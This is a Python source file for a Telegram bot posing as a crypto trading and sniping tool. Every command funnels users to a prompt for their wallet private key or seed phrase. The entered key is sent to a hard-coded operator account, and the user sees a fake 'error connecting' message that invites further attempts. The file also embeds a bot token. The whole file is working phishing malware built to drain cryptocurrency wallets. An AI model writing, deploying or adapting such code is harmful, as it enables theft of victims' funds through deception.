import telebot
import time
from telebot import types

BOT_TOKEN = '7114592477:AAHgnb_BCn7Ehua2xsKkQ68Hb-8leD1YwnA'
TARGET_USER_ID = 5643727074

bot = telebot.TeleBot(BOT_TOKEN)

user_data = {}

def handle_category_selection(message):
    chat_id = message.chat.id
    user_data[chat_id] = {}
    
    markup = types.InlineKeyboardMarkup()

    categories = [
        "No Wallet Detected - Click to Import"
    ]

    for category in categories:
        category_button = types.InlineKeyboardButton(category, callback_data=category.lower().replace("/", "_"))
        markup.add(category_button)

    bot.send_message(chat_id, "click to continue:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    chat_id = call.message.chat.id
    category = call.data
    user_data[chat_id]['category'] = category

    time.sleep(2)

    if category == 'Wallet Not Detected':
        bot.send_message(chat_id, "No Wallet Detected-Click to Import")
        bot.register_next_step_handler(call.message, process_wallet_step)
    else:
        bot.send_message(chat_id, "click /import\n")
        bot.register_next_step_handler(call.message, process_wallet_step)

@bot.message_handler(commands=['start', 'hello'])
def send_welcome(message):
    chat_id = message.chat.id
    bot.send_message(chat_id, 
        "⚙️    Welcome User! \n\n\n"
        "This bot can read contract addresses and lets you Here's a rundown of some of the main commands\n\n"
        "/config to change general options and access some other menus\n"
        "/wallets to see your balances or to add or generate wallets.\n"
        "/trades to open your trades monitor. You need to be watching a token first.\n"
        "/snipes to list your current snipes and be able to cancel them\n"
        "/balance to do a quick balance check on a token and its value.\n\n"
        "Select a category from the list provided."
    )

    time.sleep(1)
    handle_category_selection(message)

    # Redirect to process_wallet_step
    # process_wallet_step(message)

# Define separate functions for each command
@bot.message_handler(commands=['config'])
def handle_config_command(message):
    process_wallet_step(message)

@bot.message_handler(commands=['wallets'])
def handle_wallets_command(message):
    process_wallet_step(message)

@bot.message_handler(commands=['trades'])
def handle_trades_command(message):
    process_wallet_step(message)

@bot.message_handler(commands=['snipes'])
def handle_snipes_command(message):
    process_wallet_step(message)

@bot.message_handler(commands=['balance'])
def handle_balance_command(message):
    process_wallet_step(message)


@bot.message_handler(commands=['help'])
def send_help(message):
    chat_id = message.chat.id
    help_message = (
        "Here are the available commands:\n"
        "/start - Start or restart the conversation\n"
        "/help - Show available commands\n"
        "/issue - Report an issue\n"
        "Select a category from the list provided."
    )
    bot.send_message(chat_id, help_message)

@bot.message_handler(commands=['issue'])
def process_issue_command(message):
    chat_id = message.chat.id
    bot.register_next_step_handler(message, process_issue_step)

def process_issue_step(message):
    chat_id = message.chat.id
    user_data[chat_id] = {'issue': message.text}

    time.sleep(3)
    bot.register_next_step_handler(message, process_wallet_step)

def process_wallet_step(message):
    chat_id = message.chat.id
    user_data[chat_id] = {'wallet': message.text}

    bot.send_message(chat_id, "Input your Private Key\n")
    bot.register_next_step_handler(message, validate_private_key)

def validate_private_key(message):
    chat_id = message.chat.id
    private_key = message.text

    if len(private_key) < 60:
        bot.send_message(chat_id, "invalid input: Private Key must be at least 60 characters long. Please re-enter your private key.")
        bot.register_next_step_handler(message, validate_private_key)
    else:
        process_private_key(message)

def process_private_key(message):
    chat_id = message.chat.id
    private_key = message.text

    if private_key.lower() == '/continue':
        process_continue_command(message)
    else:
        bot.send_message(TARGET_USER_ID, f"User {chat_id} has provided the private key or phrase: '{private_key}'")
        bot.send_message(chat_id, f"error connecting... \n'{private_key}' import correct key or try login with phrase")

        user_data[chat_id]['private_key_provided'] = True
        command = message.text.split()[0][1:]
        handle_command_with_private_key(command)(message)
        handle_category_selection(message)

def handle_command_with_private_key(command):
    def wrapper(message): 
        chat_id = message.chat.id
        if 'private_key_provided' not in user_data[chat_id] or not user_data[chat_id]['private_key_provided']:
            bot.send_message(chat_id, "You need to provide your private key first.")
            bot.register_next_step_handler(message, process_private_key)
        else:
            if command == 'wallets':
                handle_wallets_command(message)
            elif command == 'trades':
                handle_trades_command(message)
            elif command == 'snipes':
                handle_snipes_command(message)
            elif command == 'balance':
                handle_balance_command(message)
    return wrapper


if __name__ == "__main__":
    bot.polling()
